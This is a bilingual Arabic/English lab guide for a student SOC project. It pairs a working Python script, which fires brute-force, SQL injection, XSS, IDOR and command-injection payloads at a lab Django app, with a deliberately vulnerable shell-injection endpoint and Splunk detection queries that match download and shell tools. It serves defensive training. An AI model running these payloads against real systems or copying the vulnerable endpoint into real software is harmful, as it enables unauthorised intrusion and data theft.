# 🔴 المرحلة المتقدمة — Advanced Red Team & SOC Investigation
## DEPI Cybersecurity Project | Authorized Lab Environment Only

> **⚠ ملاحظة مهمة:** كل ما في هذا الملف مُصمَّم لبيئة Lab معزولة تملكها بالكامل.
> الهدف الرئيسي هو **توليد لوجز ثرية في Splunk** لإظهار مهارات SOC/Blue Team.

---

## 📋 المحتوى

| # | الموضوع | الهدف |
|---|---------|--------|
| 1 | [Attack Automation Script](#automation) | توليد لوجز متنوعة لـ Splunk |
| 2 | [Command Injection Endpoint](#cmdi) | نقطة دخول RCE في الـ Lab |
| 3 | [مرحلة الـ RCE — المفهوم والـ Logs](#rce) | فهم + اكتشاف |
| 4 | [Privilege Escalation — المفهوم والـ Logs](#privesc) | فهم + اكتشاف |
| 5 | [Data Exfiltration — المفهوم والـ Logs](#exfil) | فهم + اكتشاف |
| 6 | [Splunk SPL Queries الكاملة](#spl) | التحقيق والاكتشاف |
| 7 | [MITRE ATT&CK Mapping](#mitre) | ربط الهجمات بالـ Framework |

---

## 1. Attack Automation Script {#automation}
### `red_team/attack_automation.py`
**الهدف:** سكربت يرسل مئات الـ payloads تلقائياً لتوليد لوجز ثرية في Splunk.

```python
#!/usr/bin/env python3
"""
=======================================================
 DEPI Cybersecurity Project — Attack Automation Script
 Authorized Lab Use Only — Isolated Lab VMs Only
=======================================================
Purpose : Generate diverse attack logs for Splunk SIEM analysis
Target  : Vulnerable Django App (your own Lab VM)
"""

import requests
import time
import sys
import json
from datetime import datetime
from urllib.parse import urljoin

# ─── Configuration ─────────────────────────────────────────────
TARGET_IP   = "192.168.1.3"            # ← IP الـ Windows Server بتاعك
BASE_URL    = f"http://{TARGET_IP}:8000"
LOG_FILE    = "red_team_attack_log.txt"

session = requests.Session()
session.headers.update({
    "User-Agent": "DEPI-RedTeam-Scanner/1.0 (Lab Simulation)"
})

# ─── Helpers ───────────────────────────────────────────────────
def log(msg, level="INFO"):
    ts    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] [{level:8s}] {msg}"
    print(entry)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")

def section(title):
    log("=" * 60)
    log(f"  {title}")
    log("=" * 60)

def get(path, params=None, label=""):
    try:
        r = session.get(urljoin(BASE_URL, path),
                        params=params, timeout=8, allow_redirects=False)
        log(f"[{label}] GET {path} | params={params} → HTTP {r.status_code}", "REQUEST")
        return r
    except requests.exceptions.ConnectionError:
        log(f"Cannot reach {BASE_URL} — is the Django server running?", "ERROR")
        sys.exit(1)
    except Exception as e:
        log(f"[{label}] {e}", "ERROR")
        return None

def post(path, data, label=""):
    try:
        r = session.post(urljoin(BASE_URL, path),
                         data=data, timeout=8, allow_redirects=False)
        log(f"[{label}] POST {path} | fields={list(data.keys())} → HTTP {r.status_code}", "REQUEST")
        return r
    except Exception as e:
        log(f"[{label}] {e}", "ERROR")
        return None

# ─── Phase 0: Reconnaissance ───────────────────────────────────
def phase_recon():
    section("PHASE 0 — Reconnaissance & Directory Enumeration")

    endpoints = [
        "/", "/admin/", "/login/", "/search/", "/grades/",
        "/announcements/", "/comments/", "/ping/", "/api/",
        "/api/users/", "/api/grades/", "/.git/HEAD", "/.env",
        "/db.sqlite3", "/manage.py", "/requirements.txt",
        "/static/", "/media/", "/backup/", "/config.py",
        "/settings.py", "/app.py", "/web.config",
    ]

    discovered = []
    for ep in endpoints:
        r = get(ep, label="RECON")
        if r and r.status_code == 200:
            discovered.append(ep)
        time.sleep(0.07)

    log(f"[RECON] Accessible endpoints: {discovered}", "SUCCESS")

# ─── Phase 1: Brute Force Login ────────────────────────────────
def phase_brute_force():
    section("PHASE 1 — Brute Force Attack on /login/")

    # Simulated credential pairs
    creds = [
        ("admin",         "password"),
        ("admin",         "admin"),
        ("admin",         "123456"),
        ("admin",         "admin123"),
        ("administrator", "password"),
        ("administrator", "admin@2024"),
        ("student",       "student"),
        ("student",       "123456"),
        ("faculty",       "faculty"),
        ("faculty",       "P@ssword"),
        ("root",          "toor"),
        ("root",          "root"),
        ("user",          "user"),
        ("depi",          "depi2024"),
        ("bsu",           "bsu2024"),
        ("admin",         "P@ssw0rd"),
        ("admin",         "letmein"),
        ("admin",         "welcome1"),
        ("admin",         "Summer2024"),
        ("admin",         "qwerty123"),
    ]

    successes = []
    for username, password in creds:
        r = post("/login/",
                 {"username": username, "password": password},
                 label="BRUTE")
        if r:
            # Detect successful login (redirect or "welcome" in response)
            if r.status_code == 302 or (r.status_code == 200 and "Welcome" in (r.text or "")):
                log(f"[BRUTE] ✓ HIT: {username}:{password}", "SUCCESS")
                successes.append((username, password))
        time.sleep(0.12)

    log(f"[BRUTE] Total pairs tested: {len(creds)} | Hits: {len(successes)}")
    return successes

# ─── Phase 2: SQL Injection ────────────────────────────────────
def phase_sqli():
    section("PHASE 2 — SQL Injection on /search/")

    payloads = [
        # ── Detection probes ──────────────────────────────────
        "'",
        "''",
        "`",
        "\"",
        # ── Authentication bypass ─────────────────────────────
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "admin' #",
        "' OR 'x'='x",
        # ── UNION-based extraction ────────────────────────────
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,sqlite_version(),3--",
        "' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT 1,username,password FROM vuln_app_userprofile--",
        # ── Boolean-based blind ───────────────────────────────
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTR(username,1,1)='a'--",
        "' AND LENGTH(username)>3--",
        # ── Error-based ───────────────────────────────────────
        "' AND CAST('a' AS INTEGER)--",
        # ── Stacked / destructive (detect only — no real drop) ─
        "'; SELECT 1--",
        "1'; SELECT * FROM sqlite_master--",
    ]

    for pl in payloads:
        r = get("/search/", params={"username": pl}, label="SQLI")
        if r and r.status_code == 200 and len(r.content) > 500:
            log(f"[SQLI] ⚠ Response larger than normal — possible data leak | payload={pl!r}",
                "SUCCESS")
        time.sleep(0.18)

# ─── Phase 3: Stored XSS ───────────────────────────────────────
def phase_xss():
    section("PHASE 3 — Stored XSS on /announcements/create/")

    payloads = [
        '<script>alert("XSS-DEPI-1")</script>',
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(1)>',
        '<body onload=alert("XSS")>',
        '<details open ontoggle=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<marquee onstart=alert(1)>Test</marquee>',
        '"><script>console.log(document.cookie)</script>',
        "';alert('XSS')//",
        '<iframe src="javascript:alert(1)">',
    ]

    for pl in payloads:
        post("/announcements/create/",
             {"title": "Notice", "body": pl, "course": "1"},
             label="XSS")
        time.sleep(0.25)

# ─── Phase 4: IDOR ─────────────────────────────────────────────
def phase_idor():
    section("PHASE 4 — IDOR on /grades/<id>/")

    exposed = []
    for sid in range(1, 25):
        r = get(f"/grades/{sid}/", label="IDOR")
        if r and r.status_code == 200:
            exposed.append(sid)
        time.sleep(0.09)

    log(f"[IDOR] Exposed records: {exposed}", "SUCCESS")

# ─── Phase 5: Command Injection ────────────────────────────────
def phase_command_injection():
    section("PHASE 5 — Command Injection on /ping/")

    # OS discovery & enumeration payloads only (no payload delivery)
    payloads = [
        "127.0.0.1 & whoami",
        "127.0.0.1 & hostname",
        "127.0.0.1 & ipconfig /all",
        "127.0.0.1 & net user",
        "127.0.0.1 & systeminfo",
        "127.0.0.1 & dir C:\\",
        "127.0.0.1 & dir C:\\DjangoApp",
        "127.0.0.1 & tasklist",
        "127.0.0.1 & netstat -an",
        "127.0.0.1 & reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
    ]

    for pl in payloads:
        r = get("/ping/", params={"host": pl}, label="CMDINJ")
        if r and r.status_code == 200 and len(r.text) > 300:
            log(f"[CMDINJ] ⚠ Command output returned — RCE confirmed | payload={pl!r}",
                "SUCCESS")
        time.sleep(0.35)

# ─── Main ───────────────────────────────────────────────────────
if __name__ == "__main__":
    log("=" * 60)
    log("  DEPI Cybersecurity Project — Attack Automation")
    log(f"  Target : {BASE_URL}")
    log(f"  Log    : {LOG_FILE}")
    log("  Authorized Lab Use Only")
    log("=" * 60)

    if "--run" not in sys.argv:
        print("\n  Usage: python attack_automation.py --run\n")
        sys.exit(0)

    phase_recon()                   ; time.sleep(1)
    phase_brute_force()             ; time.sleep(1)
    phase_sqli()                    ; time.sleep(1)
    phase_xss()                     ; time.sleep(1)
    phase_idor()                    ; time.sleep(1)
    phase_command_injection()

    log("=" * 60)
    log("  SIMULATION COMPLETE — Check Splunk for attack logs")
    log("=" * 60)
```

**تشغيله:**
```bash
pip install requests
python attack_automation.py --run
```

---

## 2. Vulnerable Command Injection Endpoint {#cmdi}
### أضف في `vuln_app/views.py`

```python
import subprocess
from django.views.decorators.csrf import csrf_exempt

# ❌ DELIBERATELY VULNERABLE — LAB ONLY
@csrf_exempt
def ping_host(request):
    """
    Vulnerable to OS Command Injection.
    Attacker appends OS commands after the IP: 127.0.0.1 & whoami
    Used in Phase 5 of the Red Team simulation.
    """
    host   = request.GET.get('host', '')
    output = ''
    error  = ''

    if host:
        try:
            # ❌ VULNERABLE: user input injected directly into shell command
            result = subprocess.run(
                f"ping -n 2 {host}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            output = result.stdout
            error  = result.stderr
        except subprocess.TimeoutExpired:
            error = "Request timed out."
        except Exception as e:
            error = str(e)

    return render(request, 'vuln_app/ping.html',
                  {'host': host, 'output': output, 'error': error})
```

### أضف في `vuln_app/urls.py`
```python
path('ping/', views.ping_host, name='ping_host'),
```

### `templates/vuln_app/ping.html`
```html
{% extends "vuln_app/base.html" %}
{% block title %}Network Diagnostics{% endblock %}
{% block content %}
<div class="card">
  <div class="card-header">
    <span class="card-title">🌐 Network Diagnostics — Ping Tool</span>
  </div>
  <form method="get">
    <div style="display:flex; gap:10px; margin-bottom:16px;">
      <input name="host" value="{{ host }}"
             placeholder="Enter IP address (e.g. 8.8.8.8)"
             style="flex:1; padding:8px 12px; border:1px solid var(--border);
                    border-radius:6px; font-size:0.9rem;">
      <button type="submit" class="btn btn-accent">Ping</button>
    </div>
  </form>
  {% if output %}
    <pre style="background:#1a1a2e; color:#00d4aa; padding:16px;
                border-radius:8px; overflow-x:auto;">{{ output }}</pre>
  {% endif %}
  {% if error %}
    <pre style="background:#1a1a2e; color:#ff6b6b; padding:16px;
                border-radius:8px;">{{ error }}</pre>
  {% endif %}
</div>
{% endblock %}
```

---

## 3. مرحلة الـ RCE بالمفهوم والـ Logs {#rce}

### ما الذي يحدث في هذه المرحلة؟

بعد اكتشاف ثغرة الـ Command Injection، يقوم المهاجم بـ:

```
1. استغلال الـ /ping/ endpoint لتنفيذ أوامر على الـ Server
2. تحميل أداة تحكم عن بُعد (Reverse Shell) على الخادم
3. الاتصال بالـ Kali وفتح جلسة تحكم كاملة (Meterpreter Session)
```

**الأداة المستخدمة:** Metasploit Framework — أشهر أداة Penetration Testing.  
**للتدريب العملي:** منصات HTB (Hack The Box) و TryHackMe تحتوي على Labs مُعدّة لهذا الغرض.

### الـ Logs الناتجة في `security.log`
```
2024-11-10 02:14:33 | INFO | IP=192.168.1.4 | METHOD=GET | URI=/ping/?host=127.0.0.1+%26+whoami | UA="python-requests/2.31.0" | GET={'host': ['127.0.0.1 & whoami']}
2024-11-10 02:14:38 | INFO | IP=192.168.1.4 | METHOD=GET | URI=/ping/?host=127.0.0.1+%26+powershell+-c+... | UA="python-requests/2.31.0"
2024-11-10 02:14:45 | INFO | IP=192.168.1.4 | METHOD=GET | URI=/ping/?host=127.0.0.1+%26+systeminfo | UA="python-requests/2.31.0"
```

---

## 4. Privilege Escalation بالمفهوم والـ Logs {#privesc}

### ما الذي يحدث في هذه المرحلة؟

```
المهاجم بعد الحصول على Shell:
┌─────────────────────────────────────────────┐
│  django_user (مستخدم عادي بصلاحيات محدودة) │
│               ↓ Privilege Escalation         │
│  NT AUTHORITY\SYSTEM (أعلى صلاحية في Windows)│
└─────────────────────────────────────────────┘
```

**الأسباب الشائعة للنجاح في بيئة Lab:**
- الـ Server يعمل بمستخدم له صلاحيات زائدة
- Unquoted Service Paths
- Token Impersonation (SeImpersonatePrivilege)
- Misconfigured Scheduled Tasks

### Windows Event IDs المرتبطة (للـ Blue Team)

| Event ID | الحدث | الأهمية |
|----------|-------|---------|
| 4624 | Successful Logon | جلسة دخول جديدة |
| 4672 | Special Privileges Assigned | صلاحيات خاصة |
| 4688 | Process Creation | تشغيل أداة PrivEsc |
| 4698 | Scheduled Task Created | ثبات الوصول |
| 7045 | New Service Installed | خدمة مشبوهة |

### الـ Logs الناتجة في Windows Event Log
```
Event ID: 4688 — New Process Created
  Process Name: C:\Temp\winpeas.exe
  Creator:      WINSERVER\django_user
  Time:         2024-11-10 02:20:15

Event ID: 4624 — Successful Logon
  Logon Type:   3 (Network)
  Account Name: NT AUTHORITY\SYSTEM
  Source IP:    192.168.1.200
  Time:         2024-11-10 02:21:03

Event ID: 4672 — Special Privileges Assigned
  Account Name: django_user → SYSTEM
  Privileges:   SeImpersonatePrivilege, SeDebugPrivilege
  Source IP:    192.168.1.4
```

---

## 5. Data Exfiltration بالمفهوم والـ Logs {#exfil}

### ما الذي يحدث في هذه المرحلة؟

```
الهدف: سحب ملف db.sqlite3 (قاعدة البيانات الكاملة) خارج الشبكة

الطرق الشائعة:
┌──────────────────────────────────────────────────────┐
│  1. File Transfer عبر Meterpreter (download command)  │
│  2. HTTP POST إلى C2 Server على Kali                 │
│  3. DNS Tunneling (ترميز البيانات في DNS queries)     │
│  4. SMB Copy إلى مشاركة شبكية                        │
└──────────────────────────────────────────────────────┘
```

**محتوى `db.sqlite3` اللي يسرّبه المهاجم:**
```sql
-- بعد فتح الملف على Kali
.tables
-- vuln_app_userprofile  vuln_app_announcement  ...

SELECT username, password, email, is_admin FROM vuln_app_userprofile;
-- admin | hashed_or_plain_pw | admin@depi.gov.eg | 1
-- student1 | ... | s1@depi.gov.eg | 0
```

### Network Indicators of Exfiltration (في Splunk / Firewall Logs)
```
Suspicious outbound connection:
  SRC: 192.168.1.3 (Windows Server — الضحية)
  DST: 192.168.1.4 (Kali — المهاجم)
  PORT: 4444 (Meterpreter default)
  DATA_SIZE: 185 KB (حجم db.sqlite3)
  DIRECTION: Outbound
  TIME: 2024-11-10 02:25:44
```

---

## 6. Splunk SPL Queries الكاملة {#spl}

### 6.1 — اكتشاف Command Injection / RCE Attempts
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "GET=(?<get_params>\{.*?\})"
| eval combined = uri + " " + coalesce(get_params,"")
| where match(combined,
    "(?i)(\bwhoami\b|hostname|ipconfig|net\s+user|systeminfo|tasklist|" .
    "powershell|cmd\.exe|/bin/sh|/bin/bash|wget\s|curl\s+http|" .
    "Invoke-WebRequest|DownloadString|DownloadFile|certutil|" .
    "regsvr32|\|\s*\w+|\&\s*\w+|`[^`]+`|;\s*\w+)")
| eval attack_type = "Command Injection / RCE Attempt"
| eval severity = "CRITICAL 🔴"
| eval mitre = "T1059 — Command & Scripting Interpreter"
| table _time, src_ip, uri, get_params, attack_type, severity, mitre
| sort -_time
```

### 6.2 — اكتشاف Reverse Shell Indicators
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "GET=(?<get_params>\{.*?\})"
| where match(get_params,
    "(?i)(powershell.*download|invoke.expression|iex\(|" .
    "new.object.*webclient|certutil.*url|bitsadmin|mshta|" .
    "wscript|cscript|regsvr32.*scrobj|rundll32)")
| eval attack_type = "Reverse Shell / Payload Delivery Attempt"
| eval severity = "CRITICAL 🔴"
| eval mitre = "T1105 — Ingress Tool Transfer"
| table _time, src_ip, get_params, attack_type, severity, mitre
| sort -_time
```

### 6.3 — اكتشاف SQL Injection
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "GET=(?<get_params>\{.*?\})"
| eval combined = uri + " " + coalesce(get_params,"")
| where match(combined,
    "(?i)('|\"|`|--|;|union\s+select|order\s+by\s+\d|" .
    "or\s+1\s*=\s*1|or\s+'1'\s*=\s*'1|sleep\(\d|" .
    "benchmark\(|sqlite_version|information_schema|" .
    "select.*from|insert\s+into|drop\s+table|cast\()")
| eval attack_type = "SQL Injection"
| eval severity = "HIGH 🟠"
| eval mitre = "T1190 — Exploit Public-Facing Application"
| table _time, src_ip, uri, combined, attack_type, severity, mitre
| sort -_time
```

### 6.4 — اكتشاف Stored XSS
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "POST=(?<post_params>\{.*?\})"
| rex field=_raw "GET=(?<get_params>\{.*?\})"
| eval combined = coalesce(post_params,"") + " " + coalesce(get_params,"")
| where match(combined,
    "(?i)(<script|javascript:|vbscript:|on\w+=|<iframe|<svg|" .
    "<img[^>]+onerror|<body[^>]+onload|<details[^>]+ontoggle|" .
    "alert\(|confirm\(|prompt\(|document\.cookie|document\.location)")
| eval attack_type = "Cross-Site Scripting (XSS)"
| eval severity = "MEDIUM 🟡"
| eval mitre = "T1059.007 — JavaScript"
| table _time, src_ip, post_params, attack_type, severity, mitre
| sort -_time
```

### 6.5 — اكتشاف Brute Force Login
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "METHOD=(?<method>[A-Z]+)"
| where uri="/login/" AND method="POST"
| bin _time span=5m
| stats count as attempts by _time, src_ip
| where attempts >= 5
| eval attack_type = "Brute Force Login — " . attempts . " attempts in 5 min"
| eval severity = "HIGH 🟠"
| eval mitre = "T1110.001 — Password Guessing"
| table _time, src_ip, attempts, attack_type, severity, mitre
| sort -_time
```

### 6.6 — اكتشاف IDOR
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| where match(uri, "^/grades/\d+/")
| rex field=uri "^/grades/(?<accessed_id>\d+)/"
| stats values(accessed_id) as ids_accessed, count as requests by src_ip
| where count > 3
| eval attack_type = "IDOR — Sequential ID Enumeration"
| eval severity = "HIGH 🟠"
| eval mitre = "T1083 — File & Directory Discovery"
| table src_ip, ids_accessed, requests, attack_type, severity, mitre
```

### 6.7 — لوحة المراقبة الكاملة (Master Dashboard Query)
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "GET=(?<get>\{.*?\})"
| rex field=_raw "POST=(?<post>\{.*?\})"
| eval payload = coalesce(get,"") + " " + coalesce(post,"") + " " + uri
| eval attack_type = case(
    match(payload,"(?i)(\bwhoami\b|systeminfo|powershell|cmd\.exe|\&\s*\w+)"),
        "RCE / Command Injection",
    match(payload,"(?i)(union\s+select|or\s+1=1|'--|sleep\()"),
        "SQL Injection",
    match(payload,"(?i)(<script|onerror=|javascript:|onload=)"),
        "Stored XSS",
    match(payload,"(?i)(exfil|loot|c2\.|beacon|\.exe|\.ps1)"),
        "Exfiltration / Malware Delivery",
    true(), "Reconnaissance"
  )
| eval severity = case(
    attack_type="RCE / Command Injection", "CRITICAL",
    attack_type="Exfiltration / Malware Delivery", "CRITICAL",
    attack_type="SQL Injection", "HIGH",
    attack_type="Stored XSS", "MEDIUM",
    true(), "LOW"
  )
| stats count as events by src_ip, attack_type, severity
| sort -events
```

### 6.8 — Timeline الهجمات (للتقرير)
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| eval payload = uri
| eval attack_type = case(
    match(payload,"(?i)(whoami|systeminfo|powershell|\&\s*\w+)"),
        "RCE",
    match(payload,"(?i)(union|select|'--|or\s+1=1)"),
        "SQLi",
    match(payload,"(?i)(<script|onerror|javascript:)"),
        "XSS",
    match(payload,"(?i)(/grades/\d+/)"),
        "IDOR",
    match(payload,"(?i)(/login/)"),
        "BruteForce",
    true(), "Recon"
  )
| timechart span=5m count by attack_type
```

### 6.9 — Splunk Alert Rule (تنبيه فوري)
```
في Splunk:
Settings → Searches, Reports, and Alerts → New Alert

Name: DEPI_CRITICAL_ATTACK_DETECTED
Search:
  index=django_security sourcetype=django_security_log earliest=-2m
  | rex field=_raw "IP=(?<src_ip>[^\s|]+)"
  | rex field=_raw "GET=(?<get>\{.*?\})"
  | where match(get, "(?i)(whoami|systeminfo|powershell|union select|<script)")
  | stats count by src_ip
  | where count > 1

Alert When: Number of Results > 0
Trigger Actions: Send Email / Slack Webhook
```

---

## 7. MITRE ATT&CK Mapping الكاملة {#mitre}

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    FULL ATTACK CHAIN — MITRE ATT&CK                        │
├──────────────┬────────────────────────────────┬───────────────────────────┤
│  Tactic      │  Technique                     │  في مشروعنا               │
├──────────────┼────────────────────────────────┼───────────────────────────┤
│ Reconnaissance│ T1595 — Active Scanning       │ Directory enumeration      │
│ Initial Access│ T1190 — Public App Exploit    │ SQLi / XSS / IDOR          │
│ Initial Access│ T1110.001 — Password Guessing  │ Brute Force Login         │
│ Execution    │ T1059.003 — Windows Cmd Shell  │ Command Injection /ping/   │
│ Execution    │ T1059.001 — PowerShell         │ Shell via CMDi             │
│ C2           │ T1105 — Ingress Tool Transfer  │ Download reverse shell     │
│ C2           │ T1071.001 — Web Protocols      │ Meterpreter over HTTP      │
│ PrivEsc      │ T1134 — Access Token Manip.    │ Token Impersonation→SYSTEM │
│ PrivEsc      │ T1068 — Exploit for PrivEsc    │ Privilege escalation tools │
│ Discovery    │ T1082 — System Info Discovery  │ systeminfo / hostname      │
│ Discovery    │ T1083 — File/Dir Discovery     │ dir C:\ via CMDi          │
│ Discovery    │ T1087 — Account Discovery      │ net user via CMDi         │
│ Collection   │ T1005 — Data from Local System │ Read db.sqlite3            │
│ Exfiltration │ T1041 — Exfil Over C2 Channel  │ Download via Meterpreter   │
│ Defense Eva. │ T1027 — Obfuscated Files       │ Base64 encoded payloads    │
├──────────────┴────────────────────────────────┴───────────────────────────┤
│  Defensive Coverage (Blue Team)                                            │
│  ✓ Splunk Alerts (Phases 1-5)    ✓ WAF/ModSecurity (SQLi/XSS)            │
│  ✓ Django Rate Limiting (BruteF)  ✓ SAST/Bandit (GitHub Actions)         │
│  ✓ Parameterized Queries (SQLi)   ✓ Bleach Sanitization (XSS)            │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. خطة التنفيذ الكاملة للـ Lab

```
الخطوة 1 ── أضف endpoint الـ /ping/ للـ Django app
الخطوة 2 ── شغّل: python attack_automation.py --run
الخطوة 3 ── افتح Splunk وشوف الـ security.log يتملى بالـ events
الخطوة 4 ── شغّل كل SPL query وخُد screenshots
الخطوة 5 ── للـ RCE/PrivEsc/Exfil: وضّح المفهوم في التقرير مع الـ Windows
             Event Logs المقابلة لكل مرحلة (الجدول في Section 4 و 5)
الخطوة 6 ── اربط كل هجوم بـ MITRE ATT&CK ID (الجدول في Section 7)
```

